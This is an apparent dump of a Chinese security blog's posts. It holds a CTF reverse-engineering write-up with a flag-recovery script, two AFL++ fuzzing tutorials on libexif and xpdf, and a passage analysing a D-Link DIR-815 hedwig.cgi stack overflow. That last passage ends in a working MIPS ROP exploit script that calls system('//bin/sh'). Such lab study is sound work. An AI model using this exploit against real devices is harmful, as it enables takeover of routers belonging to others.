bfe71c3fc9a97828f241ac11366770a05122a4f417cd204af44efcc62cbcf5479fae6329729a7200beff3957a790caaee598247161956f379186835e81663f6c36b6903194664a963cf6f71832639a72ccd6ac52d02f3837f24b017fe93ae20e515bc4934710bb53841b621b7a0f1fd25d9bff8bad23675ff26a7f6b06313fb43505b94e4597cd56c583fda3a5b465 您好, 这里需要密码.","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"DAS九月赛","slug":"DAS九月赛","date":"2022-09-19T16:00:00.000Z","updated":"2022-09-20T13:49:49.434Z","comments":true,"path":"2022/09/20/DAS九月赛/","link":"","permalink":"http://example.com/2022/09/20/DAS%E4%B9%9D%E6%9C%88%E8%B5%9B/","excerpt":"","text":"landingF|landing|1ens看main函数汇编界面，发现异常处理，修改汇编发现真正逻辑，调试提取数据 nothing函数有一个简单的花指令 去除之后是一个base64变体，注意第三十行的加一，然后就是解密： cbNET.NET文件 加了壳和混肴 [分享]ConfuserEx1.0-加壳脱壳-看雪论坛-安全社区|安全招聘|bbs.pediy.com 用ConfuserEx和de4dot脱壳去除混肴得到最后的文件 PS：一开始没注意到Confuser那层壳，调试文件 main函数的arry2是一个exe文件（开头是MZ，dump出来，再用de4dot去除混肴。 主逻辑在GClass1里 加密0是一个简单的异或 加密一是判断素数 加密二是一个goto构成的较为复杂的未知加密， 最后的比较 大致算法如此 12345678910111213141516171819def isPrime(n):# 判断n是否为质数 if n &lt; 2: return 0 for i in range(2, n - 1): if n % i == 0: return 0 return 1for num2 in range(len(input)):# input为第一个函数异或加密后的数组 try: input(num2) = (input(num2) ^ (input(i - 1) // (num2 % 8))) + input(num2 - 1) % (num2 % 8) except: input(num2) = (input(num2) ^ (input(i + 7) // 8)) + input(num2 + 7) % 8 input(num2) = input(num2) - 2 - (input(num2) % 2) for j in range(2,input(num2) - 1): if isPrime(j) and isPrime(input(num2) - j): input(i) = j * (input(num2) - j) 由于最后一步将原来的数减2或者减3（取决于原来的数是奇数还是偶数）之后分解为两个质数和，原来的数会有奇数和偶数两种情况的存在，所以最后的逆向脚本需要进行递归爆破 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import hashlibdef isPrime(n): if n &lt; 2: return 0 for i in range(2, n - 1): if n % i == 0: return 0 return 1def xordecrypt(key): str = &quot;0rays&quot; circle = 0 flag = &quot;&quot; for i in range(len(key)): flag = flag + chr(key[i] ^ ord(str[circle])) circle = (circle + 1) ^ 5 flag = &quot;CBCTF&#123;&quot; + flag + &quot;&#125;&quot; t = hashlib.sha256() t.update(flag.encode()) finalflag = t.hexdigest() if finalflag == &quot;15c4ac7645546a1ef8141441b48e1824954fdbb159bf96400061b17db1af9edf&quot;: print(flag) exit(0)def recursion(key2, i): key = key2.copy() if (i % 8) != 0: key[i] = (key[i] - key[i - 1] % (i % 8)) ^ (key[i - 1] // (i % 8)) else: key[i] = (key[i] - key[i + 7] % 8) ^ (key[i + 7] // 8) if i != 0: decrypt(key, i - 1) else: xordecrypt(key)def decrypt(key1, i): key = key1.copy() for j in range(2, key[i] - 2): if key[i] % j == 0 and isPrime(j) and isPrime(key[i] // j): key[i] = j + key[i] // j break key[i] = key[i] + 2 recursion(key, i) key[i] = key[i] + 1 recursion(key, i)key = [309, 1981, 2823, 6979, 28339, 39487, 33035, 283711, 623, 4109, 23551, 54761, 67985, 231149, 499603, 1354567, 213, 2651, 22559, 52549, 484663, 290793, 532213, 1746643]decrypt(key, 23) 得到flag CBCTF{Vb_1s_SucH_An_e4sY_w0rk1}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-DAS","slug":"DAS","permalink":"http://example.com/tags/DAS/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"fuzz_1","slug":"fuzz-1","date":"2022-08-31T16:00:00.000Z","updated":"2022-09-01T08:01:15.088Z","comments":true,"path":"2022/09/01/fuzz-1/","link":"","permalink":"http://example.com/2022/09/01/fuzz-1/","excerpt":"","text":"Fuzzing101 Execise2-libexifCVE-2009-3895 （heap-based buffer overflow）and CVE-2012-2836 （Out-of-bounds Read）in libexif 0.6.14 Exif是一种文件格式，这是在网上搜索到的相关描述： 可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。 首先创建一个文件夹用于存放Fuzz目标： 1mkdir libexif &amp;&amp; cd libexif 找到libexif文件，下载并解压： 123wget https://sourceforge.net/projects/libexif/files/libexif/0.6.18/libexif-0.6.18.tar.gztar -zxvf libexif-0.6.18.tar.gzcd libexif-0.6.18 因为libexif编译后是一个库文件，所以还需要下载使用库接口的应用程序，这里选择exif命令行0.6.15 12wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gztar -xzvf exif-0_6_15-release.tar.gz 构建首先回到libexif库文件目录下进行编译： 12345sudo apt-get install autopoint libtool gettext libpopt-devautoreconf -fvi./configure --enable-shared=no --prefix=&quot;/home/fuzz/libexif/install/&quot;makemake install 此时库文件已经编译好了，再进入exif目录进行编译： 12345cd exif-exif-0_6_15-release/autoreconf -fvi //用于适配系统环境，简化config命令./configure --enable-shared=no --prefix=&quot;/home/fuzz/libexif/install/&quot; PKG_CONFIG_PATH=$HOME/libexif/install/lib/pkgconfigmakemake install 测试exif能否运行只需要输入： 1$HOME/libexif/install/bin/exif 此时应该看到如下内容： 下载exif的测试样本： 1git clone https://github.com/ianare/exif-samples.git 下载好后进入目录，使用exif命令随便查看一张图片的信息： 1$HOME/libexif/install/bin/exif Nikon_D70.jpg 可以看到如下结果： 执行Fuzz获取交互应用（如果调试的是库，需要调用接口fuzz） 自己写一个c程序调用接口，用afl提供的编译器编译出来 直接找调用了库文件的应用，这是这题采用的方法 这次使用afl-clang-lto作为编译器来构建程序，afl-clang-lto相比于afl-clang-fast是更好的选择，因为它是一种无碰撞检测，而且比afl-clang-fast 快。 先删除原先的安装，重新编译安装库 1234567rm -r $HOME/libexif/installcd $HOME/libexif/libexif-0.6.18make cleanexport LLVM_CONFIG=&quot;llvm-config-12&quot;CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/libexif/install&quot;makemake install 重新编译应用 123456cd $HOME/libexif/libexif-0.6.18/exif-exif-0_6_15-releasemake cleanexport LLVM_CONFIG=&quot;llvm-config-12&quot;CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/libexif/install/&quot; PKG_CONFIG_PATH=$HOME/libexif/install/lib/pkgconfigmakemake install 然后就可以开始fuzz了 1afl-fuzz -i /home/fuzz/libexif/exif_samples/jpg/ -o /home/fuzz/libexif/out -s 123 -- /home/fuzz/libexif/install/bin/exif @@ 使用GDB将crash文件输入到程序中： 1gdb --args /home/fuzz/libexif/install/bin/exif ./crash1.jpg 报错如下 查看回溯 参考： AFL++ Fuzz一个libexif例子 - unr4v31 - 博客园 (cnblogs.com)","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"http://example.com/tags/fuzz/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"fuzz_0","slug":"fuzz-0","date":"2022-08-29T16:00:00.000Z","updated":"2022-09-01T08:03:01.933Z","comments":true,"path":"2022/08/30/fuzz-0/","link":"","permalink":"http://example.com/2022/08/30/fuzz-0/","excerpt":"","text":"fuzz初试（AFL++）简介：模糊测试（Fuzzing&#x2F;Fuzz）是一种自动化软件测试技术，它基于为程序提供随机或变异的输入值并监视它的异常和崩溃。 AFL 是一个覆盖引导的模糊器（coverage-guided fuzzer），这意味着它收集每个变异输入的覆盖信息，来发现新的执行路径和潜在的错误。当源代码可用时，AFL 可以使用插桩（instrumentation），在每个基本块（函数、循环等）的开头插入函数调用。 AFL++使用qemu用户模式模拟仿真来运行二进制文件，其使用的qemu是进行修改的版本，在程序执行时检测基本块，根据收集的信息生成测试用例，通过生成的大量测试用例触发不同的代码路径，从而提高代码的覆盖率，提高触发Crash的概率。 AFL的一些基础 AFL对开源代码进行fuzzing的过程可以用以下五步描述： 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage） #AFL的覆盖率，计算在一次运行中，相应边执行的次数，次数单位为2的幂（以缓解路径爆炸）。如果一个用例输入发现了至少一条边，也就是创建一个新的桶来装入新的边的次数，那么这个用例就是interesting用例，并放入队列。AFL用一个bitmap把这些装有边次数的桶整合起来，一个byte代表一条边 选择一些输入文件，作为初始测试集加入输入队列（queue） 将队列中的文件按一定的策略进行 “突变” 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中 上述过程会一直循环进行，期间触发了crash的文件会被记录下来 其大致思路是，对输入的seed文件不断地变化，并将这些mutated input喂给target执行，检查是否会造成崩溃。因此，fuzzing涉及到大量的fork和执行target的过程。也就是说，父进程fork出一个子进程执行输入用例，父进程等待结果。这样可以避免频繁调用execve（）函数。但是，fork也会有性能瓶颈的问题，AFL提出persistent mode，该模式下不会为每个测试用例fork。 取而代之的是，可以将循环的方式添加到目标程序中，也就是每次迭代执行一个测试用例。 AFL++变异器（对测试输入进行一些操作自定义变异器允许相关的模糊测试的研究在 AFL++ 之上构建新的调度算法、变异算法等等，而无需像当前许多工具那样fork 和修补 AFL。插件可以用 C ABI 兼容的语言编写，甚至可以用 Python 进行原型设计。例如，使用当前的 API，AFLSMART 可以作为 AFL++ 插件完全重写十次。目前AFL++实现了以下功能： afl_custom_(de)init ：初始化AFL++的伪随机数种子生成器 afl_custom_queue_get：其是一个回调函数，用于确定自定义的FUZZer是否应该FUZZ当前队列的用例。 afl_custom_fuzz：对给定的输入执行自定义变异。 afl_custom_havoc_mutation：对给定的输入执行单个自定义变异。 这种突变与AFL的havoc阶段的其他变异策略叠加在一起。 afl_custom_post_process：在某些情况下，从自定义 mutator 返回的变异数据的格式不适合作为输入到目标程序执行。例如，当使用 libprotobuf-mutator 时，返回的数据是对应于给定语法的 protobuf 格式，首先需要将其转换为目标的纯文本格式。 在这种情况下，或者要修复校验和以及大小，用户可以定义 afl_custom_post_process 函数。 afl_custom_queue_new_entry：在将新测试用例添加到队列后调用，这是一个存储元数据的API。 支持用例修剪的API 修剪用例的目的是减少因为大量产生用例导致格式过于复杂，以至于不符合协议格式。 afl_custom_init_trim：该API在每次修剪操作开始时被调用并接收初始缓冲区。它返回此次输入上可能的迭代次数（例如，如果输入有 n 个元素，其中一个应该被删除，则返回 n-1）。 如果实现的修剪算法不允许确定（剩余）步骤的数量，那么它可以返回 1 表示可以执行进一步的修剪，这将在 afl_custom_post_trim 返回 0 时执行。 afl_custom_trim：每次修剪操作都会调用 afl_custom_trim。 它可以记住当前状态，因此可以保存每次迭代的重新分析的步骤。该API返回修剪后的输入缓冲区，其返回的数据长度不得超过初始输入数据。 afl_custom_post_trim：该API在每次修剪操作后调用以通知修剪步骤是否成功。 插桩1 LLVMLLVM主要包含以下两种插桩方式：上下文敏感的边缘覆盖：edge覆盖是将每个block被分配的ID与被调用者的唯一ID进行异或运算。Ngram：在记录edge时不考虑前一个块和目标块，而是考虑目标块和前 N-1 个块，其中 N 是 2 到 16 之间的数字。 2 GCC除了包含旧的 afl-gcc 包装器，AFL++ 还附带了一个 GCC 插件。 它包括对延迟初始化和persistent 模式的支持，例如 AFL LLVM 模式。 3 QEMU该模式针对二进制程序进行模糊测试。 CVE-2019-13288 in XPDF 3.02实验环境配置虚拟机Ubuntu 20.04.2 LTS 镜像。用户名为 fuzz &#x2F; fuzz。 下载并构建首先为Fuzz目标创建一个新目录： 12cd $HOMEmkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/ 可能需要安装一些额外的工具（即 make 和 gcc） 1sudo apt install build-essential 下载 Xpdf 3.02： 12wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gztar -xvzf xpdf-3.02.tar.gz 构建 Xpdf： 12345cd xpdf-3.02sudo apt update &amp;&amp; sudo apt install -y build-essential gcc./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;makemake install 现在可以开始测试Xpdf。首先，需要下载一些 PDF 示例： 12345cd $HOME/fuzzing_xpdfmkdir pdf_examples &amp;&amp; cd pdf_exampleswget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdfwget http://www.africau.edu/images/default/sample.pdfwget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf 可以使用以下命令测试 pdfinfo 二进制文件： 1$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf 安装AFLplusplus安装依赖： 1234sudo apt-get updatesudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptoolssudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\\..*//&#x27;)-dev 构建 AFL++： 12345cd $HOMEgit clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplusexport LLVM_CONFIG=&quot;llvm-config-11&quot;make distribsudo make install 输入afl-fuzz如下即为成功 使用AFL++开始Fuzz当源代码可用时，AFL 可以使用检测，在每个基本块（函数、循环等）的开头插入函数调用。为了为目标应用程序启用检测，所以需要使用 AFL 的编译器编译代码。简单来说就是需要使用afl编译器来编译目标。 首先，清理所有以前编译的目标文件和可执行文件： 123rm -r $HOME/fuzzing_xpdf/installcd $HOME/fuzzing_xpdf/xpdf-3.02/make clean 现在将使用afl-clang-fast编译器构建 xpdf 1234export LLVM_CONFIG=&quot;llvm-config-11&quot;CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;makemake install 现在可以使用以下命令运行Fuzz： 1afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output 执行参数说明： -i：表示输入文件目录 -o：表示 AFL++ 将存储变异文件的目录 -s：表示要使用的静态随机种子（AFL 使用非确定性测试算法，因此两个Fuzz会话永远不会相同。这就是为什么设置固定种子 -s 123的原因。用以保证Fuzz结果和示例相同。） @@：是占位符目标的命令行，AFL 将用每个输入文件名替换它 如果收到「Hmm, your system is configured to send core dump notifications to an external utility…」类似的命令，执行以下操作关闭核心转储： 123sudo suecho core &gt;/proc/sys/kernel/core_patternexit 可以看到红色的uniq crashes值，显示找到的唯一崩溃的数量。可以在$HOME/fuzzing_xpdf/out/default/crashes目录中找到这些崩溃文件。一旦发现第一个崩溃，就可以使用control+c停止 fuzzer。 什么时候可以停止fuzzer?其中一个指标可以参考cycles done 的数字颜色，依次会出现洋葱红色，黄色，蓝色，绿色，变成绿色时就很难产生新的crash文件了。 将此文件作为输入传递给 pdftotext 二进制文件（如果提示无法打开文件，将文件名称改为xxx.pdf再尝试） 1$HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/crash.pdf $HOME/fuzzing_xpdf/output 使用 gdb 找出程序因该输入而崩溃的原因 首先，需要使用调试信息重建 Xpdf 以获得符号堆栈跟踪： 123456rm -r $HOME/fuzzing_xpdf/installcd $HOME/fuzzing_xpdf/xpdf-3.02/make cleanCFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;makemake install 现在，可以运行 GDB： 1gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/crash.pdf $HOME/fuzzing_xpdf/output 然后，在 GDB 中输入： 1run 如果一切顺利，应该会看到以下输出： 然后输入bt以获取栈回溯：bt 报错信息Program received signal SIGSEGV, Segmentation fault，存在内存泄漏 报错位置 _int_malloc (av=av@entry=0x7ffff7c63b80 &lt;main_arena&gt;, bytes=bytes@entry=7) at malloc.c:1210，glibc报了个错，显然是堆内存出了问题 执行流信息，分析一下可以看出调用过程是循环的，判断为无限循环漏洞 根据函数调用找到漏洞位置 漏洞修复下个xpdf4.02源码对比一下就好，修复方式比较简单，加了个变量，记录循环次数，超过一定次数就结束进程。 参考： [原创]AFL速通——流程及afl-fuzz.c源码简析-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com AFL++ (PlusPlus) 介绍与实践 - WelkinChan - 博客园 (cnblogs.com) 模糊测试之AFL总结 (myfzy.top) AFL(American Fuzzy Lop)实现细节与文件变异 (seebug.org)","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"http://example.com/tags/fuzz/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"D-LINK DIR-815多次溢出漏洞","slug":"D-LINK DIR-815多次溢出漏洞","date":"2022-08-24T16:00:00.000Z","updated":"2022-08-25T12:34:11.093Z","comments":true,"path":"2022/08/25/D-LINK DIR-815多次溢出漏洞/","link":"","permalink":"http://example.com/2022/08/25/D-LINK%20DIR-815%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"准备 参考：[原创]家用路由器漏洞挖掘实例分析[图解D-LINK DIR-815多次溢出漏洞]-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com 该漏洞的描述位于这里，可知漏洞出现在hedwig.cgi文件中，漏洞产生的原因是Cookie的值超长造成缓冲区溢出。首先了解一下cgi文件。 cgi(Common Gateway Interface)，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。 固件下载地址 http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP binwalk解压固件 查看bin&#x2F;busybox得知是MIPS32，小端： 寻找线索find . -name &#39;*cgi&#39;查找文件 并ls -l ./htdocs/web/hedwig.cgi发现hedwig.cgi是指向.&#x2F;htdocs&#x2F;cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。 静态分析IDA静态调试cgibin文件，hedwigcgi_main函数处理整个过程，由于是HTTP_COOK这个字段引起的漏洞溢出点，可以在IDA（SHIFT+F12）搜索字符串，然后通过X，交叉引用来跟踪到hedwigcgi_main函数条用的位置。 跟踪到主函数的位置hedwigcgi_main，对函数功能进行大致分析，可以定位到其中的sprintf函数引起了栈溢出。调用sess_get_uid，得到HTTP_COOKIE的值。同样创建两个指针数组a1,a2，以等号为界将前半部分存入a1偏移为5处，后半部分存入a2偏移为5处，a1[5]为uid则将a2[5]存入参数指针数组的偏移为5处。函数sobj_get_string获得该数组中指向cookie的指针。 IDA动态调试-确定偏移位置程序通过 getenv 的方式获取 HTTP 数据包中的数据，流程应该为： 1234主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据#POST具体数据可以通过类似输入流传入 ：echo &quot;uid=aaa&quot;| /htdocs/web/hedwig.cgi 测试脚本test.sh 12345678910111213#!/bin/bash#注意：里面=和变量之间一定不要有空格，坑，否则读入空数据。test=$(python -c &quot;print (&#x27;uid=&#x27;+open(&#x27;content&#x27;,&#x27;r&#x27;).read(2000))&quot;) #方式一，以文件形式读入内容，提前填充好构造的数据到content文件#test=$(python -c &quot;print &#x27;uid=&#x27; + &#x27;A&#x27;*0x600&quot; )#方式二，直接后面接数据内容#test=$(python -c &quot;print &#x27;uid=&#x27;+open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;)#test =$(python -c &quot;print &#x27;uid=&#x27; + &#x27;A&#x27;*1043 + &#x27;B&#x27;*4&quot;)#可选构造数据 LEN=$(echo -n &quot;$test&quot; | wc -c) PORT=&quot;1234&quot;cp $(which qemu-mipsel-static) ./qemusudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$test -E REQUEST_URL=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null #-E参数：加入环境变量 ；2&gt;/dev/null ：不输出提示错误rm -f ./qemu 利用patternLocOffset.py生成content文件，包含特定格式的2000个字符串。类似于cyclic 1python patternLocOffset.py -c -l 2000 -f content 在0x0409A38处断下 python patternLocOffset.py -s 0x38694237 -l 2000计算偏移： 跟完sess_get_uid()函数可发现后面还有一个sprintf()，这里也会造成栈溢出，哪到底哪个才是真正的利用点呢 从整个函数可以看出，fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)的成功与否会导致程序走向这两个地方，即成功后是第二个sprintf()为溢出利用点，而失败时是第一个sprintf()为溢出利用点 如果 fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;) 打开成功则会执行到第二个 sprintf，因为没有实机没法判断实际固件中是否有这个目录 因此我们手动创建该目录及文件 12mkdir var/tmptouch var/tmp/temp.xml 这里假设第二个sprintf()为漏洞点（其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造 rop 链方法都是一样的），所以偏移得重新计算 但是haystack为0的话无法走到第二个sprintf 交叉引用找到这 动调可知在sub_402B40函数，这里影响着haystack的赋值 这部分前面的代码，可知随便传点参数即可 参考D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站 1234567891011#!/bin/bash# test2.shINPUT=&quot;x=x&quot;COOKIE=$(python -c &quot;print(&#x27;uid=&#x27; + open(&#x27;context&#x27;,&#x27;r&#x27;).read())&quot;)PORT=&quot;1234&quot;LEN=$(echo -n &quot;$INPUT&quot; | wc -c)cp $(which qemu-mipsel-static) ./qemuecho $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $PORT /htdocs/web/hedwig.cgirm -f ./qemu 最终的偏移为1009. ROP 链的构造gdb-multiarch+QEMU动态调试分析验证1，通过gdb指定脚本调试（避免重复输入，重复造轮子浪费时间） 123456set architecture mipsset endian littletarget remote :1234b *0x409a54cvmmap 执行 #一定要加载文件htdocs&#x2F;cgibin不然vmmap得不到结果 1gdb-multiarch htdocs/cgibin -x dbgscript -x是指定要执行的命令文件 but…还是每找到完整的vmmap 但实际上，我们查看 lib 目录下的 libc.so.0 即可知 找到systeam的地址 另外一种方法 12345678from pwn import *context.arch = &quot;mips&quot;context.endian = &quot;little&quot;libc = ELF(&quot;./lib/libuClibc-0.9.30.1.so&quot;)libc.address = 0x77fe2000 # base address rop链的基地址，确定方法在后面system_addr = libc.symbols[&#x27;system&#x27;]log.success(&quot;system address: 0x%x&quot; % system_addr) 得到 system address: 0x7f78b200 然后便是找一个能将 system() 首个参数写入 $a0 的 gadget，这里在 libuClibc-0.9.30.1.so 中使用 mipsrop 插件，利用 mipsrop.stackfinder() 命令找将栈上数据放入寄存器的 gadget： 打开 mips rop gadgets 然后命令行输入mipsrop.stackfinders() 选择0x159cc的指令。该指令序列首先将SP+0x10（动调）地址存入寄存器S5中，而在偏移0x159EO处将$S5作为参数存入 Sa0，也就是说，这里需要将第一步得到的system地址填充到$So中，然后在$SP+0x10处填充需要执行的命令，即可实现对system(“”command”)函数的调用。 因为 system地址的最低位为0x00，而在 hedwig_main获取Cookie的过程中，也没有对这部分数据进行解码，所以，试图通过访问 hedwig.cgi时对Cookie进行编码来避开0x00是不可能的，这就使 sprintf函数可能被截断，造成缓冲区溢出失败。为了避开 0x00，写入时- 1 ，后面再找一个 gadget 加一即可 hedwigcgi_main() 结尾部分： 修改 12345678910$s0$s1$s2$s3$s4$s5$s6$s7$fp$ra &lt;== 返回地址 ROP的思路 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *from MIPSPayload import MIPSPayloadimport string, random, sysclass MIPSPayload: BADBYTES = b&quot;\\x00&quot; LITTLE = &quot;little&quot; BIG = &quot;big&quot; FILLER = b&quot;A&quot; BYTES = 4 def __init__(self, elfbase:int, endian:str = LITTLE, badbytes: bytes = BADBYTES): self.elfbase = elfbase self.badbytes = badbytes self.endian = endian self.payload = bytes() def rand_text(self, size): table = (string.ascii_letters + string.digits).encode() return bytes(random.choices(table, k=size)) def Add(self, data): if type(data) is bytes: self.payload += data else: raise TypeError(&quot;%s is no support type&quot; % type(data)) def Address(self, offset, base=None): if base is None: base = self.elfbase return self.ToBytes(base + offset) def AddAddress(self, offset, base=None): self.Add(self.Address(offset, base)) def ToBytes(self, value, size=BYTES): data = [(value &gt;&gt; (8 * i)) &amp; 0xff for i in range(size)] if self.endian != self.LITTLE: data = data[::-1] return bytes(data) def AddNOPs(self, size): self.Add(self.rand_text(size)) def AddBuffer(self, size, byte=FILLER): self.Add(byte * size) def Build(self): count = 0 for c in self.payload: if self.badbytes.find(c) != -1: raise ValueError(&quot;Bad byte found in payload at offset %d: 0x%.2X&quot; % (count, c)) count += 1 return self.payload def Print(self, bpl = BYTES): i = 0 for c in self.payload: if i == 4: print() i = 0 sys.stdout.write(&quot;\\\\x%.2X&quot; % c) sys.stdout.flush() if bpl &gt; 0: i += 1 print(&quot;\\n&quot;)context.arch = &quot;mips&quot;context.endian = &quot;little&quot;context.log_level = &quot;debug&quot;payload = MIPSPayload(0x7f738000)libc = ELF(&quot;./lib/libuClibc-0.9.30.1.so&quot;)libc.address = 0x77fe2000system_addr = libc.symbols[&#x27;system&#x27;]log.success(&quot;system address: 0x%x&quot; % system_addr)calcsystem = 0x158c8 # $s0 add 1, jalr $s5callsystem = 0x159cc # cmd -&gt; $a0, jalr $s0 (system_addr)payload.AddBuffer(0x3CD) # 973payload.AddAddress(system_addr - 1) # $s0 977payload.AddBuffer(4) # $s1 981payload.AddBuffer(4) # $s2 985payload.AddBuffer(4) # $s3 989payload.AddBuffer(4) # $s4 993 payload.AddAddress(callsystem) # $s5 997payload.AddBuffer(4) # $s6 1001payload.AddBuffer(4) # $s7 1005payload.AddBuffer(4) # $fp 1009payload.AddAddress(calcsystem) # $rapayload.AddBuffer(0x10) # .text:000159CC addiu $s5, $sp, 0x170+var_160payload.Add(b&#x27;//bin/sh&#x27;)f = open(&quot;exploit&quot;, &#x27;wb+&#x27;)f.write(payload.Build())f.close() qemu系统模式这里主要是为了在qemu虚拟机中重现http服务。 /sbin/httpd应该是用于监听web端口的http服务，同时查看/htdocs/web文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。 find ./ -name &#39;*http*&#39;找到web配置文件httpcfg.php 查看内容后分析出httpcfg.php文件的作用是生成供所需服务的配置文件的内容，所以我们参照里面内容，自己创建一个conf作为生成的配置文件，填充我们所需的内容。（留个坑，暂时没搞懂） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576Umask 026PIDFile /var/run/httpd.pidLogGMT On #开启logErrorLog /log #log文件 Tuning&#123; NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60&#125; Control&#123; Types &#123; text/html &#123; html htm &#125; text/xml &#123; xml &#125; text/plain &#123; txt &#125; image/gif &#123; gif &#125; image/jpeg &#123; jpg &#125; text/css &#123; css &#125; application/octet-stream &#123; * &#125; &#125; Specials &#123; Dump &#123; /dump &#125; CGI &#123; cgi &#125; Imagemap &#123; map &#125; Redirect &#123; url &#125; &#125; External &#123; /usr/sbin/phpcgi &#123; php &#125; &#125;&#125; Server&#123; ServerName &quot;Linux, HTTP/1.1, &quot; ServerId &quot;1234&quot; Family inet Interface eth0 #对应qemu仿真路由器系统的网卡 Address 192.168.40.138 #qemu仿真路由器系统的IP Port &quot;1234&quot; #对应未被使用的端口 Virtual &#123; AnyHost Control &#123; Alias / Location /htdocs/web IndexNames &#123; index.php &#125; External &#123; /usr/sbin/phpcgi &#123; router_info.xml &#125; /usr/sbin/phpcgi &#123; post_login.xml &#125; &#125; &#125; Control &#123; Alias /HNAP1 Location /htdocs/HNAP1 External &#123; /usr/sbin/hnap &#123; hnap &#125; &#125; IndexNames &#123; index.hnap &#125; &#125; &#125;&#125; 使用qemu-system-mipsel从系统角度进行模拟，就需要一个mips架构的内核镜像和文件系统。可以在如下网站下载：Index of &#x2F;~aurel32&#x2F;qemu 因为是小端，这里直接选择mipsel，然后下载其中两个文件： debian_squeeze_mipsel_standard.qcow2是文件系统，vmlinux-3.2.0-4-4kc-malta是内核镜像 启动脚本start.sh 12345678sudo qemu-system-mipsel \\-M malta \\-kernel vmlinux-3.2.0-4-4kc-malta \\-hda debian_squeeze_mipsel_standard.qcow2 \\-append &quot;root=/dev/sda1 console=tty0&quot; \\-net nic \\-net tap \\-nographic \\ 输入用户名&#x2F;密码 root&#x2F;root或user&#x2F;user即可登录qemu模拟的系统 接下来在宿主机创建一个网卡，使qemu内能和宿主机通信。 安装依赖库： 